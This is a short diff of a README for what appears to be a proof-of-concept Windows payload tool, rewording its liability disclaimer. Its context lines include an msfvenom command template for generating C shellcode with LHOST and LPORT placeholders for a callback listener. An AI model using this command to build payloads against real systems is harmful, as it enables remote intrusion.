@@ -65,4 +65,4 @@ sudo pacman -S mingw-w64-gcc
 => Shellcode generator: `msfvenom -p <Payload> LHOST=<IP> LPORT=<LOCAL PORT> --platform windows --arch <x64/x86> -f c`
 
 # Warning:    
-> I am not responsible for any illegal use or damage caused by this tool. It primarily serves as a proof of concept, is intended to raise awareness about cybersecurity and can be improved in many ways.
+> I am not responsible for any illegal use or damage caused by this tool. It primarily serves as a proof of concept and it won't guarantee success in real-world situations
